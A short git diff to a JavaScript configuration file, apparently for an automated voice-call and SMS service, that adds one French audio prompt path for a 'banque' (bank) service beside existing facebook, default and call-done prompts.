@@ -38,6 +38,7 @@ module.exports = {
     facebookfilepath: './voice/fr/facebook/ask-facebook.mp3',
     endfilepath: './voice/fr/done/call-done.mp3',
     defaultfilepath: './voice/fr/default/ask-default.mp3',
+    banquefilepath: './voice/fr/banque/ask-banque.mp3',
 
     /**
      * Contenu des sms selon les services demandés
